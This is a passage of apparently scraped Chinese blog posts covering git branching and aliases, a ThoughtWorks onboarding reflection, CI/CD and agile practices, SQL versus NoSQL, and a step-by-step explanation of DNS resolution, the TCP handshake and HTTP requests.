查看分支 git branch &lt;name&gt; # 创建分支 git checkout &lt;name&gt; # 切换分支 git checkout -b &lt;name&gt; # 创建并切换分支 git merge &lt;name&gt; #合并某分支到当前分支 git branch -d &lt;name&gt; # 删除分支 git branch -D &lt;name&gt; # 强行删除分支 当更改同时发生在两个分支上，这时候我们有需要对两个分支进行合并，那解决冲突是很容易发生的状况这时候我们需要使用git status 查看状态，执行合并之后在当前分支解决合并冲突问题，在合并就可以了可以使用一下命令查看分支合并情况： git log --graph 忽略别名在git中可以通过编辑.gitignore 文件达到控制忽略文件类型的目的，当文件自动不被add 到仓库里。忽略的语法规则：(#)表示注释(*) 表示任意多个字符;(?) 代表一个字符; ([abc]) 代表可选字符范围如果名称最前面是路径分隔符 (/) ，表示忽略的该文件在此目录下。如果名称的最后面是 (/) ，表示忽略整个目录，但同名文件不忽略。通过在名称前面加 (!) ，代表不忽略。例子如下： # 这行是注释 *.a # 忽略所有 .a 伟扩展名的文件 !lib.a # 但是 lib.a 不忽略，即时之前设置了 忽略所有的 .a /TODO # 只忽略此目录下 TODO 文件，子目录的 TODO 不忽略 build/ # 忽略所有的 build/ 目录下文件 doc/*.txt # 忽略如 doc/notes.txt, 但是不忽略如 doc/server/arch.txt 关于不同编程语言，通常会有统一的忽略规则，大家可以在这里直接找到配置模板：https://github.com/github/gitignore 快捷命令配置在git里可以使用 git config --global alias.&lt;shortname&gt; &lt;command_name&gt; 的方式指定快捷命令，以下为一些常用的快捷命令设置 git config --global alias.st status git config --global alias.co checkout git config --global alias.ci commit git config --global alias.br branch git config --global alias.unstage &#39;reset HEAD&#39; git config --global alias.last &#39;log -1&#39; git config --global alias.lg &quot;log --color --graph --pretty=format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot; ok ,that’s all","tags":[{"name":"工具","slug":"工具","permalink":"https://www.duyidong.com/tags/工具/"},{"name":"版本管理","slug":"版本管理","permalink":"https://www.duyidong.com/tags/版本管理/"}]},{"title":"ThoughtWorks第一周学习总结","date":"2016-05-24T13:44:57.000Z","path":"2016/05/24/ThoughtWorks第一周学习总结/","text":"关于一周来学习情况总结不知不觉进入TW已经一周了，深感自己离成为一个合格的TWer还有很长的距离。在学习的过程中离不开总结和分享，在TW最棒的就是可以随时和身边的技术牛人们分享自己的学习心得，时时总结，有助于梳理自己的知识体系，巩固自己的学习方法。正所谓“时时勤拂拭，莫使惹尘埃”。 下面就几个关键词进行一个小结： 我所除的环境ThouhgtWorks显而易见的工作习惯 1.Email 轰炸 2.Stand metting 就像Align Development里面提到的一样，Stand up, Aline Comstomer 在TW被很好地执行，每日站会是必不可少的 3.频繁的沟通 之前的工作经验告诉我，你只需要写得一手好代码就可以在公司站稳脚跟，但是这点认知在TW被彻底推翻，与代码同样重要的是你的沟通能力，在实际开发过程中，沟通消耗的资源甚至会大于写代码的消耗。 4.Pair-Programming 这也是Align Deployment的重要一环，在TW几乎每一件事都是pair的，这中工作方式可以有效地解决掉“个人英雄”的问题，一段代码出了问题，至少有两个人可以来改这段代码。同时加强了程序员之间的交流，也有利于代码规范的实施。 5.代码洁癖 由于每一段代码都会有人review,这使很多TWer养成了代码洁癖，代码不但要实现功能，还要写得好看，这一点我个人认为也是极好的。 6.频繁的workshop和session 7.无处不在的敏捷 在TW，敏捷已经超越一种开发方式而成为一种文化存在，步步为营，小步前进，似乎是每一个工程师低调而又自信的工作方式。这很好，值得学习：） 我面临的问题工作方式上的问题是很容易适应的，TW有宽松的工作环境和乐于助人的同事。让我吃惊的是我接触到的每一个同事都是健谈而友好的，其中不乏很多大神，所以我一点都不担心自己成长。目前只需要找到自己的短板，针对性的进行一些加强性训练： 1.英文能力 从进公司到现在，已经从几乎听不懂同事们在说什么到可以看英文文档了，但是英文交流还存在严重的问题，主要表现在无法用英语表达自己所想的内容，另外英文阅读和听力速度还有些跟不上 2.DevOps专业能力 目前我接触到的DevOps能力主要落实到几个工具的使用上：Jenkins,AWS,ansible,另外还需要掌握vagrant,git,shell,yaml，Linux命令（Vi编辑器命令）对工具来讲，整体不难，拿下英文文档，实际需要的只是操作，后面几个更倾向于需要具备的基本素质才是我目前最需要达到的目标。 3.习惯的建立 习惯主要分为工作习惯，学习习惯，和生活习惯，这几点在过去的一周几乎是混乱的，这几个习惯应该有一定的准则，概括来说，工作习惯应该是高效可靠，随时可以再session和当前的work中切换自己的状态，那么设计到的内容主要是calendar的管理和mind.txt的优化，我还没有上手公司正式项目，所以目前工作效率优化仅仅停留在自己的事情备忘和计划这个层面。生活习惯，目前来讲主要是健身和游泳，羽毛球视club活动参加，生活应该规律，保证健康的身体和工作时间有一个清醒的大脑。学习习惯是所有习惯中最重要的，主要是根据学习时间，blog时间和阅读时间是每天不可少的内容，希望这些习惯可以再TW贯彻下去. 我的应对1.关于英语问题，目前的解决方式是阅读MartinFlower的博客，以及每天用英语进行工作总结，尽可能熟悉英文语境以求更好表达自己想表达的东西。 2.DevOps专业能力 workshop基本只适用于还没有建立起自己学习习惯的人和对一个东西建立初步认识，session也不能对技术提高起到决定性的帮助，频繁的沟通带来的缺点是时间的碎片化，我需要随时跟进自己的一个进程进展到什么程度，有效挂起和有效恢复，才能保证工作和学习同步有效地进行。 具体来说专业能力的提高除了被动在工作中使用需要用到的技术，跟以前一样，还是要在工作之余对在工作中遇到的问题进行挖掘，弄清楚背后的原理，才能应对同样的问题以及问题的变种。 3.习惯的建立 工作上和生活上不用花太大心思，生活上只要保证每天早晚各半个小时的锻炼整个人的精气神就会大不一样。周末游泳，这个不用我说自然会有的。 我的决定基于以上现状以及分析，我的个人时间计划表初步安排如下： 7：00 起床 ~7：30洗漱，锻炼 ~8：00阅读英语，内容为随机选取技术博客活着计划任务一篇 9：00~12：00工作 12：00~13：00阅读一小时 13：00~13：30可以适当午休 14：00~19:00工作，汇报一天的工作 20：00成功降落 晚上：整理白天产生的mind.txt，选取一个技术点blog 英文能力训练二十分钟，阅读一小时，锻炼半小时 23:00睡觉","tags":[{"name":"ThoughtWorks","slug":"ThoughtWorks","permalink":"https://www.duyidong.com/tags/ThoughtWorks/"},{"name":"学习","slug":"学习","permalink":"https://www.duyidong.com/tags/学习/"},{"name":"小结","slug":"小结","permalink":"https://www.duyidong.com/tags/小结/"}]},{"title":"CI/CD","date":"2016-05-19T12:04:35.000Z","path":"2016/05/19/CI-CD/","text":"Agile DevelopmentBefore we talk about CI and CD， I think we should figure out why we need them, so we have to talk about Agile Development first.Agile Development is a set of principles for software development. It was develop to response to changing customer’s requirement. As we all know, managers generally desirable to quantify the progress of the development, but quantify of the coding is not easy, the quantify we can only control is the process of the requirment. So we can process a requirement implemented as an iteration cycle of software development.For this purpose, they created with CI and CD as the core of agile development. Continuous Integration(CI)Continuous Integration means you need to integration at least daily, It’s a development practice that requires developers to integrate code into a shared repository several times a day.”Shared”” means everyone can see what others working on, Frequently compile, test, commit means every times we commit, the code could be running, ideally, every integration should be automated, the unit-test allowing teams to detect problems early. By integration regularly, you can detect errors quickly, and locate them more easily.there are many advantages for Continuous Integration, one of which is the continuous delivery. Continuous Delivery(CD)Continuous Delivery is customer requirement oriented, It’s like Continuous Integration but more than it, Continuous Delivery is the natural extension of Continuous Integration, Continuous Delivery makes releases boring, so we can deliver frequently and get fast feedback on what users care about. Continuous DeploymentContinuous Deployment is more than Continuous Delivery, seams like this: It is the practice of keeping your codebase deployable at any point. Beyond making sure your application passes automated tests it has to have all the configuration necessary to push it into production. Many teams then do push changes that pass the automated tests into a test or production environment immediately to ensure a fast development loop.A simplified continuous deployment flow can look like this: Development Operations(DevOps)Development Operations is bigger than Continuous Deployment, It aims at establishing a culture and environment where building testing, and releasing software, can happen rapidly, and more reliably.In my words, DevOps is a practical form of agile. Tools for CI and CDJenkins GoCD TeamCity Travis CI","tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"Agile","slug":"Agile","permalink":"https://www.duyidong.com/tags/Agile/"}]},{"title":"RDBMS和NOSQL的技术差别","date":"2016-04-20T02:01:24.000Z","path":"2016/04/20/RDBMS和NOSQL的技术差别/","text":"创新的背后往往会刺激痛苦。这一点在PDD(我们亲切地称为痛处驱动开发)软件开发领域尤为真实。从上世纪80年代以来，我们就都知道如何处理关系型数据——只要把数据放到关系型数据库管理系统(RDBMS)中，就可以使用SQL语句操作数据。然而，在过去几年来，我们的行业采纳NoSQL数据库的趋势在增长，数据不见得都在关系型数据库中存储了。诚然，在互联网上有成千上万关于选择SQL还是NoSQL的辩论。但是，这两者是不是必须站在对立面战斗呢？如果你选择一种或另一种，你知道为什么做选择，知道各自有何潜在益处吗？本文简要地讨论了SQL和NoSQL两种方法最常见的优点和缺点，包括简单的比较和开发者考虑的因素。像别的一些话题一样，这个问题没有对错，永远正确的经典答案依然是：具体问题具体分析。 数据表VS.数据集关系型和非关系型数据库的主要差异是数据存储的方式。关系型数据天然就是表格式的，因此存储在数据表的行和列中。数据表可以彼此关联协作存储，也很容易提取数据。与其相反，非关系型数据不适合存储在数据表的行和列中，而是大块组合在一起。非关系型数据通常存储在数据集中，就像文档、键值对或者图结构。你的数据及其特性是选择数据存储和提取方式的首要影响因素。 预定义结构VS.动态结构关系型数据通常对应于结构化数据，因为数据表都有预定义好的结构(列的定义)，结构描述了数据的形式和内容。这一点对数据建模至关重要，你必须“第一时间先把结构定义好”。虽然预定义结构带来了可靠性和稳定性，但是已经存入数据的表结构要修改就非常痛苦了。另一方面，非关系型数据基于动态结构，通常适用于非结构化数据。非关系型数据可以很容易适应数据类型和结构的变化，因为动态结构本身就支持这一点。 存储规范化VS存储代价关系型数据库的数据存储是为了更高的规范性，把数据分隔成最小的逻辑表(关系表)以避免重复，获得最精简的空间利用。虽然数据规范性会使数据管理更清晰，但它通常也会带来一点点复杂性，尤其是单个操作可能涉及多个关系表的时候，数据管理就有点麻烦。另外，更精简的空间利用通常可以节约宝贵的数据存储，但是在当今世界我们基本可以认为存储的代价(磁盘空间)是微不足道的。而非关系型数据存储在平面数据集中，数据经常可能存在重复。单个数据库很少被分隔开，而是存储成一个整体，这样是为了整块数据更容易读写。 纵向扩容VS横向扩容SQL和NoSQL数据库最大的差别可能是在扩展方式上，要支持日益增长的需求当然要扩展。要支持更多并发量，SQL数据库是纵向扩展，也就是说提高处理能力，使用速度更快速的计算机，这样处理相同的数据集就更快了。因为数据存储在关系表中，操作的性能瓶颈可能涉及很多个表，这都需要通过提高计算机性能来客服。虽然SQL数据库有很大扩展空间，但最终肯定会达到纵向扩展的上限。而NoSQL数据库是横向扩展的。非关系型数据存储天然就是分布式的，NoSQL数据库的扩展可以通过给资源池添加更多普通的数据库服务器(节点)来分担负载。 结构化查询VS非结构化查询关系型数据库通过所谓结构化查询语言(也就是我们常说的SQL)来操作数据。SQL支持数据库CRUD(增加，查询，更新，删除)操作的功能非常强大，是业界标准用法。非关系型数据库以块(像文档一样)为单元操纵数据，使用所谓的非结构化查询语言(UnQL)，它是没有标准的，因数据库提供商的不同而不同。关系型表中主键的概念对应非关系存储中的文档Id。SQL数据库使用预定义优化方式(比如列索引定义)帮助加速查询操作，而NoSQL数据库采用更简单而精确的数据访问模式。 映射VS本地化SQL和NoSQL数据存储的选择还取决于开发人员，尽管这个因素影响不大。采用面向对象编程语言的开发人员通常会同时操作一个或多个数据实体(包括嵌套数据、列表和数组的复杂结构)，把数据传递给应用程序用户界面。要是讨论到底层数据库，事情就并不总是那么公平合理了。在关系型存储中，数据实体通常需要分成多个部分进行规范化，然后分开存储到多个关系型表中精简存储。幸运的是，这是一个长期存在的问题，大部分编程平台都有相应的简单解决方案，比如ORM层(对象关系映射)。ORM是位于关系型数据源和开发者使用的面向对象数据实体之间的一个映射层。然而，对于非关系型存储，不需要规范化数据，复杂数据实体可以整体存放在独立单元中。应用程序中使用的对象通常序列化为JSon串，存储在NoSQL数据库的JSon文档中。 事务性VS纯扩展性如果你的数据操作需要高事务性或者复杂数据查询需要控制执行计划，那么传统的SQL数据库从性能和稳定性方面考虑是你的最佳选择。SQL数据库支持对事务原子性细粒度控制，并且易于回滚事务。虽然NoSQL数据库也可以使用事务操作，但它们真正闪亮的价值是在操作的扩展性和大数据量处理方面。 ACID VS CAPSQL 数据库久负盛名的价值就是通过所谓的ACID属性(原子性，一致性，隔离性，持久性)保证数据完整性，大部分关系型存储供应商都支持ACID。我们的目标是支持隔离不可分割的事务，其变化是持久的，数据也保持一致状态。而NoSQL数据库是让你在CAP(一致性，可用性，分区容忍度)中的任意两项中选择，因为在基于节点的分布式系统中，很难做到三项都满足。 数据VS大数据SQL数据库可以可靠地存储和处理数据，而NoSQL最大的优势是在应对大数据方面，也就是由我们社会或者计算机每天产生的大量非结构化的数据实体。NoSQL用无模式方式做数据管理，所以其横向扩展潜力是无限的，这可能是深度处理大数据捕获、管理、检索、分析和可视化的唯一有效途径。 数据记录VS物联网和人联网关系数据库在关注数据规范化和保证性能的基础上精简存储。但是近年来，我们产生数据的速度远大于关系型存储能满足存储的能力增长。刺激数据如此迅猛增长的原因是：巨大量的用户数和物联网。连接到互联网的用户在成倍增加，在同步使用我们的应用。由于大量移动设备数据传感设备接入互联网，机器产生的数据量也大幅增加。因此企业必须寻求NoSQL技术及基础架构来处理持续涌入的半结构化和非结构化数据。 内部部署VS云计算云计算现在已经无处不在了，它兼具SQL和NoSQL数据库的益处。云环境中的关系型存储通常是以服务形式提供的，是可复制、高可用性且分布式的，极大地提高了横向扩展能力。托管于云服务中的NoSQL数据库也天然享有自动分片的好处，可以阶段性地灵活弹性处理，集成高速缓存和巨大的计算能力来捕获、存储和分析大数据。 付费VS开源有一种看法认为，SQL数据库大多数比较昂贵，而NoSQL数据库通常都是开源的。事实上，两种类型数据库都有开源的和商业的。常见的SQL 数据库有微软公司的SQL Server，MySQL，SQLite，Oracle和PostGres。流行的NoSQL数据库有Couchbase，MongoDB，Redis，BigTable和RavenDB。 结论就像Neo之于Matrix，你可以选择。幸福的无知和幻想或者接受残酷的现实。但是，盲目选择使用SQL还是NoSQL技术，或者根据大众需求选择都是在幻想有魔法会自动选择合适的方案。SQL和NoSQL这两者都有各自的优缺点，选择正确的架构取决于你构建应用的需求。传统SQL数据库依然非常强大，可以可靠地处理你的事务性需求并保持完整性。只有在你接近关系数据库局限性边缘时，或者你的数据处理量浩如烟海时，操作扩展需要更加分布式的系统时，才考虑NoSQL方案。考虑这些因素之后再做选择，你就可以变成释放你的数据构建下一代应用令人叹为观止的神人。 原文链接","tags":[{"name":"数据库","slug":"数据库","permalink":"https://www.duyidong.com/tags/数据库/"}]},{"title":"敏捷开发","date":"2016-04-19T06:41:46.000Z","path":"2016/04/19/敏捷开发/","text":"敏捷开发是一种以人为核心、迭代、循序渐进的开发方法。在敏捷开发中，软件项目的构建被切分成多个子项目，各个子项目的成果都经过测试，具备集成和可运行的特征。换言之，就是把一个大项目分为多个相互联系，但也可独立运行的小项目，并分别完成，在此过程中软件一直处于可使用状态。 Test-Driven Development，测试驱动开发。 它是敏捷开发的最重要的部分。在ThoughtWorks，我们实现任何一个功能都是从测试开始，首先对业务需求进行分析，分解为一个一个的Story，记录在Story Card上。然后两个人同时坐在电脑前面，一个人依照Story，从业务需求的角度来编写测试代码，另一个人看着他并且进行思考，如果有不同的意见就会提出来进行讨论，直到达成共识，这样写出来的测试代码就真实反映了业务功能需求。接着由另一个人控制键盘，编写该测试代码的实现。如果没有测试代码，就不能编写功能的实现代码。先写测试代码，能够让开发人员明确目标，就是让测试通过。 Continuous Integration，持续集成。 在以往的软件开发过程中，集成是一件很痛苦的事情，通常很长时间才会做一次集成，这样的话，会引发很多问题，比如 build未通过或者单元测试失败。敏捷开发中提倡持续集成，一天之内集成十几次甚至几十次，如此频繁的集成能尽量减少冲突，由于集成很频繁，每一次集成的改变也很少，即使集成失败也容易定位错误。一次集成要做哪些事情呢？它至少包括：获得所有源代码、编译源代码、运行所有测试，包括单元测试、功能测试等；确认编译和测试是否通过，最后发送报告。当然也会做一些其它的任务，比如说代码分析、测试覆盖率分析等等。 Refactoring，重构。 相信大家对它都很熟悉了，有很多很多的书用来介绍重构，最著名的是Martin的《重构》，Joshua的《从重构到模式》等。重构是在不改变系统外部行为下，对内部结构进行整理优化，使得代码尽量简单、优美、可扩展。在以往开发中，通常是在有需求过来，现在的系统架构不容易实现，从而对原有系统进行重构；或者在开发过程中有剩余时间了，对现在代码进行重构整理。但是在敏捷开发中，重构贯穿于整个开发流程，每一次开发者check in代码之前，都要对所写代码进行重构，让代码达到clean code that works。值得注意的是，在重构时，每一次改变要尽可能小，用单元测试来保证重构是否引起冲突，并且不只是对实现代码进行重构，如果测试代码中有重复，也要对它进行重构。 Pair-Programming，结对编程。 在敏捷开发中，做任何事情都是Pair的，包括分析、写测试、写实现代码或者重构。Pair做事有很多好处，两个人在一起探讨很容易产生思想的火花，也不容易走上偏路。在我们公司，还有很多事都是Pair来做，比如Pair学习，Pair翻译，Pair做PPT，关于这个话题，钱钱同学有一篇很有名的文章对它进行介绍，名为Pair Programming (结对编程)。 Stand meeting，站立会议。 每天早上，项目组的所有成员都会站立进行一次会议，由于是站立的，所以时间不会很长，一般来说是15-20分钟。会议的内容并不是需求分析、任务分配等，而是每个人都回答三个问题：1. 你昨天做了什么？2. 你今天要做什么？ 3. 你遇到了哪些困难？站立会议让团队进行交流，彼此相互熟悉工作内容，如果有人曾经遇到过和你类似的问题，那么在站立会议后，他就会和你进行讨论。 Frequent Releases，小版本发布。 在敏捷开发中，不会出现这种情况，拿到需求以后就闭门造车，直到最后才将产品交付给客户，而是尽量多的产品发布，一般以周、月为单位。这样，客户每隔一段时间就会拿到发布的产品进行试用，而我们可以从客户那得到更多的反馈来改进产品。正因为发布频繁，每一个版本新增的功能简单，不需要复杂的设计，这样文档和设计就在很大程度上简化了。又因为简单设计，没有复杂的架构，所以客户有新的需求或者需求进行变动，也能很快的适应。 Minimal Documentation，较少的文档。 其实敏捷开发中并不是没有文档，而是有大量的文档，即测试。这些测试代码真实的反应了客户的需求以及系统API 的用法，如果有新人加入团队，最快的熟悉项目的方法就是给他看测试代码，而比一边看着文档一边进行debug要高效。如果用书面文档或者注释，某天代码变化了，需要对这些文档进行更新。一旦忘记更新文档，就会出现代码和文档不匹配的情况，这更加会让人迷惑。而在敏捷中并不会出现，因为只有测试变化了，代码才会变化，测试是真实反应代码的。这时有人会问：代码不写注释行吗？一般来说好的代码不是需要大量的注释吗？其实简单可读的代码才是好的代码，既然简单可读了，别人一看就能够看懂，这时候根本不需要对代码进行任何注释。若你觉得这段代码不加注释的话别人可能看不懂，就表示设计还不够简单，需要对它进行重构。 Collaborative Focus，以合作为中心，表现为代码共享。 在敏捷开发中，代码是归团队所有而不是哪些模块的代码属于哪些人，每个人都有权利获得系统任何一部分的代码然后修改它，如果有人看到某些代码不爽的话，那他能够对这部分代码重构而不需要征求代码作者的同意，很可能也不知道是谁写的这部分代码。这样每个人都能熟悉系统的代码，即使团队的人员变动，也没有风险。 Customer Engagement ，现场客户。 敏捷开发中，客户是与开发团队一起工作的，团队到客户现场进行开发或者邀请客户到团队公司里来开发。如果开发过程中有什么问题或者产品经过一个迭代后，能够以最快速度得到客户的反馈。 Automated Testing ，自动化测试。 为了减小人力或者重复劳动，所有的测试包括单元测试、功能测试或集成测试等都是自动化的，这对QA人员提出了更高的要求。他们要熟悉开发语言、自动化测试工具，能够编写自动化测试脚本或者用工具录制。我们公司在自动化测试上做了大量的工作，包括Selenium开源项目。 Adaptive Planning，可调整计划。 敏捷开发中计划是可调整的，并不是像以往的开发过程中，需求分析-&gt;概要设计-&gt;详细设计-&gt;开发 -&gt;测试-&gt;交付，每一个阶段都是有计划的进行，一个阶段结束便开始下一个阶段。而敏捷开发中只有一次一次的迭代，小版本的发布，根据客户反馈随时作出相应的调整和变化。 敏捷开发过程与传统的开发过程有很大不同，在这过程中，团队是有激情有活力的，能适应更大的变化，做出更高质量的软件。 敏捷宣言：四中核心价值观和十二条原则我们一直在实践中探寻更好的软件开发方法，身体力行的同时也帮助他人。由此我们建立了如下价值观：个体和互动 高于 流程和工具工作的软件 高于 详尽的文档客户合作 高于 合同谈判响应变化 高于 遵循计划也就是说，尽管右项有其价值，我们更重视左项的价值。我们遵循以下原则：我们最重要的目标，是通过持续不断地及早交付有价值的软件使客户满意。欣然面对需求变化，即使在开发后期也一样。善于掌控变化，帮助客户获得竞争优势。经常地交付可工作的软件，相隔几星期或一两个月，倾向于采取较短的周期。业务人员和开发人员必须相互合作，项目中的每一天都不例外。激发个体的斗志，以他们为核心搭建项目。提供他们所需的环境和支持，相信他们能够达成目标。不论团队内外，传递信息效果最好效率也最高的方式是面对面的交谈。可工作的软件是进度的首要度量标准。敏捷过程倡导可持续开发。责任人、开发人员和用户要能够共同维持其步调稳定延续。对技术精益求精，对设计不断完善，将提高敏捷能力。以简洁为本，极力减少不必要工作量。最好的架构、需求和设计出自于自组织的团队。团队定期地反思如何能提高成效，并依此调整团队的行为。 参考资料","tags":[{"name":"敏捷","slug":"敏捷","permalink":"https://www.duyidong.com/tags/敏捷/"},{"name":"Agile","slug":"Agile","permalink":"https://www.duyidong.com/tags/Agile/"}]},{"title":"一次完整的HTTP事务是怎样一个过程","date":"2016-04-17T03:35:37.000Z","path":"2016/04/17/一次完整的HTTP事务是怎样一个过程？/","text":"当我们在浏览器的地址栏输入 www.linux178.com ，然后回车，回车这一瞬间到看到页面到底发生了什么呢？以下过程仅是个人理解： 域名解析 –&gt; 发起TCP的3次握手 –&gt; 建立TCP连接后发起http请求 –&gt; 服务器响应http请求，浏览器得到html代码 –&gt; 浏览器解析html代码，并请求html代码中的资源（如js、css、图片等） –&gt; 浏览器对页面进行渲染呈现给用户 关于HTTP协议可以参考以下：HTTP协议漫谈 http://kb.cnblogs.com/page/140611/ HTTP协议概览 http://www.cnblogs.com/vamei/archive/2013/05/11/3069788.html 了解HTTP Headers的方方面面 http://kb.cnblogs.com/page/55442/ 以下就是上面过程的一一分析，我们就以Chrome浏览器为例： 域名解析首先Chrome浏览器会解析 www.linux178.com 这个域名（准确的叫法应该是主机名）对应的IP地址。怎么解析到对应的IP地址？ ① Chrome浏览器 会首先搜索浏览器自身的DNS缓存（缓存时间比较短，大概只有1分钟，且只能容纳1000条缓存），看自身的缓存中是否有www.linux178.com 对应的条目，而且没有过期，如果有且没有过期则解析到此结束。 注：我们怎么查看Chrome自身的缓存？可以使用 chrome://net-internals/#dns 来进行查看 ② 如果浏览器自身的缓存里面没有找到对应的条目，那么Chrome会搜索操作系统自身的DNS缓存,如果找到且没有过期则停止搜索解析到此结束. 注：怎么查看操作系统自身的DNS缓存，以Windows系统为例，可以在命令行下使用 ipconfig /displaydns 来进行查看 ③ 如果在Windows系统的DNS缓存也没有找到，那么尝试读取hosts文件（位于C:\\Windows\\System32\\drivers\\etc），看看这里面有没有该域名对应的IP地址，如果有则解析成功。 ④ 如果在hosts文件中也没有找到对应的条目，浏览器就会发起一个DNS的系统调用，就会向本地配置的首选DNS服务器（一般是电信运营商提供的，也可以使用像Google提供的DNS服务器）发起域名解析请求（通过的是UDP协议向DNS的53端口发起请求，这个请求是递归的请求，也就是运营商的DNS服务器必须得提供给我们该域名的IP地址），运营商的DNS服务器首先查找自身的缓存，找到对应的条目，且没有过期，则解析成功。如果没有找到对应的条目，则有运营商的DNS代我们的浏览器发起迭代DNS解析请求，它首先是会找根域的DNS的IP地址（这个DNS服务器都内置13台根域的DNS的IP地址），找打根域的DNS地址，就会向其发起请求（请问www.linux178.com这个域名的IP地址是多少啊？），根域发现这是一个顶级域com域的一个域名，于是就告诉运营商的DNS我不知道这个域名的IP地址，但是我知道com域的IP地址，你去找它去，于是运营商的DNS就得到了com域的IP地址，又向com域的IP地址发起了请求（请问www.linux178.com这个域名的IP地址是多少?）,com域这台服务器告诉运营商的DNS我不知道www.linux178.com这个域名的IP地址，但是我知道linux178.com这个域的DNS地址，你去找它去，于是运营商的DNS又向linux178.com这个域名的DNS地址（这个一般就是由域名注册商提供的，像万网，新网等）发起请求（请问www.linux178.com这个域名的IP地址是多少？），这个时候linux178.com域的DNS服务器一查，诶，果真在我这里，于是就把找到的结果发送给运营商的DNS服务器，这个时候运营商的DNS服务器就拿到了www.linux178.com这个域名对应的IP地址，并返回给Windows系统内核，内核又把结果返回给浏览器，终于浏览器拿到了www.linux178.com 对应的IP地址，该进行一步的动作了。 注：一般情况下是不会进行以下步骤的如果经过以上的4个步骤，还没有解析成功，那么会进行如下步骤（以下是针对Windows操作系统）： ⑤ 操作系统就会查找NetBIOS name Cache（NetBIOS名称缓存，就存在客户端电脑中的），那这个缓存有什么东西呢？凡是最近一段时间内和我成功通讯的计算机的计算机名和Ip地址，就都会存在这个缓存里面。什么情况下该步能解析成功呢？就是该名称正好是几分钟前和我成功通信过，那么这一步就可以成功解析。 ⑥ 如果第⑤步也没有成功，那会查询WINS 服务器（是NETBIOS名称和IP地址对应的服务器） ⑦ 如果第⑥步也没有查询成功，那么客户端就要进行广播查找 ⑧ 如果第⑦步也没有成功，那么客户端就读取LMHOSTS文件（和HOSTS文件同一个目录下，写法也一样） 如果第八步还没有解析成功，那么就宣告这次解析失败，那就无法跟目标计算机进行通信。只要这八步中有一步可以解析成功，那就可以成功和目标计算机进行通信。 看下图抓包截图：Linux虚拟机测试，使用命令 wget www.linux178.com 来请求，发现直接使用chrome浏览器请求时，干扰请求比较多，所以就使用wget命令来请求，不过使用wget命令只能把index.html请求回来，并不会对index.html中包含的静态资源（js、css等文件）进行请求。 抓包分析： ① 号包，这个是那台虚拟机在广播，要获取192.168.100.254（也就是网关）的MAC地址，因为局域网的通信靠的是MAC地址，它为什么需要跟网关进行通信是因为我们的DNS服务器IP是外围IP，要出去必须要依靠网关帮我们出去才行。② 号包，这个是网关收到了虚拟机的广播之后，回应给虚拟机的回应，告诉虚拟机自己的MAC地址，于是客户端找到了路由出口。 ③ 号包，这个包是wget命令向系统配置的DNS服务器提出域名解析请求（准确的说应该是wget发起了一个DNS解析的系统调用），请求的域名www.linux178.com,期望得到的是IP6的地址（AAAA代表的是IPv6地址）④ 号包，这个DNS服务器给系统的响应，很显然目前使用IPv6的还是极少数，所以得不到AAAA记录的⑤ 号包，这个还是请求解析IPv6地址，但是www.linux178.com.leo.com这个主机名是不存在的，所以得到结果就是no such name ⑥ 号包，这个才是请求的域名对应的IPv4地址（A记录）⑦ 号包，DNS服务器不管是从缓存里面，还是进行迭代查询最终得到了域名的IP地址，响应给了系统，系统再给了wget命令，wget于是得到了www.linux178.com的IP地址，这里也可以看出客户端和本地的DNS服务器是递归的查询（也就是服务器必须给客户端一个结果）这就可以开始下一步了，进行TCP的三次握手。 发起TCP的3次握手拿到域名对应的IP地址之后，User-Agent（一般是指浏览器）会以一个随机端口（1024 &lt; 端口 &lt; 65535）向服务器的WEB程序（常用的有httpd,nginx等）80端口发起TCP的连接请求。这个连接请求（原始的http请求经过TCP/IP4层模型的层层封包）到达服务器端后（这中间通过各种路由设备，局域网内除外），进入到网卡，然后是进入到内核的TCP/IP协议栈（用于识别该连接请求，解封包，一层一层的剥开），还有可能要经过Netfilter防火墙（属于内核的模块）的过滤，最终到达WEB程序（本文就以Nginx为例），最终建立了TCP/IP的连接。如下图：1） Client首先发送一个连接试探，ACK=0 表示确认号无效，SYN = 1 表示这是一个连接请求或连接接受报文，同时表示这个数据报不能携带数据，seq = x 表示Client自己的初始序号（seq = 0 就代表这是第0号包），这时候Client进入syn_sent状态，表示客户端等待服务器的回复2） Server监听到连接请求报文后，如同意建立连接，则向Client发送确认。TCP报文首部中的SYN 和 ACK都置1 ，ack = x + 1表示期望收到对方下一个报文段的第一个数据字节序号是x+1，同时表明x为止的所有数据都已正确收到（ack=1其实是ack=0+1,也就是期望客户端的第1个包），seq = y 表示Server 自己的初始序号（seq=0就代表这是服务器这边发出的第0号包）。这时服务器进入syn_rcvd，表示服务器已经收到Client的连接请求，等待client的确认。3） Client收到确认后还需再次发送确认，同时携带要发送给Server的数据。ACK 置1 表示确认号ack= y + 1 有效（代表期望收到服务器的第1个包），Client自己的序号seq= x + 1（表示这就是我的第1个包，相对于第0个包来说的），一旦收到Client的确认之后，这个TCP连接就进入Established状态，就可以发起http请求了。看抓包截图： ⑨ 号包 这个就是对应上面的步骤 1）⑩ 号包 这个对应的上面的步骤 2）号包 这个对应的上面的步骤 3） TCP 为什么需要3次握手？ 举个例子： 假设一个老外在故宫里面迷路了，看到了小明，于是就有下面的对话： 老外： Excuse me，Can you Speak English? 小明： yes 。 老外： OK,I want ... 在问路之前，老外先问小明是否会说英语，小明回答是的，这时老外才开始问路 2个计算机通信是靠协议（目前流行的TCP/IP协议）来实现,如果2个计算机使用的协议不一样，那是不能进行通信的，所以这个3次握手就相当于试探一下对方是否遵循TCP/IP协议，协商完成后就可以进行通信了，当然这样理解不是那么准确。 为什么HTTP协议要基于TCP来实现？ 目前在Internet中所有的传输都是通过TCP/IP进行的，HTTP协议作为TCP/IP模型中应用层的协议也不例外，TCP是一个端到端的可靠的面向连接的协议，所以HTTP基于传输层TCP协议不用担心数据的传输的各种问题。 建立TCP连接后发起http请求进过TCP3次握手之后，浏览器发起了http的请求（看第包），使用的http的方法 GET 方法，请求的URL是 / ,协议是HTTP/1.0 下面是第12号包的详细内容： 以上的报文是HTTP请求报文。 那么HTTP请求报文和响应报文会是什么格式呢？ 起始行：如 GET / HTTP/1.0 （请求的方法 请求的URL 请求所使用的协议）头部信息：User-Agent Host等成对出现的值主体 不管是请求报文还是响应报文都会遵循以上的格式。 那么起始行中的请求方法有哪些种呢？ GET: 完整请求一个资源 （常用） HEAD: 仅请求响应首部 POST：提交表单 （常用） 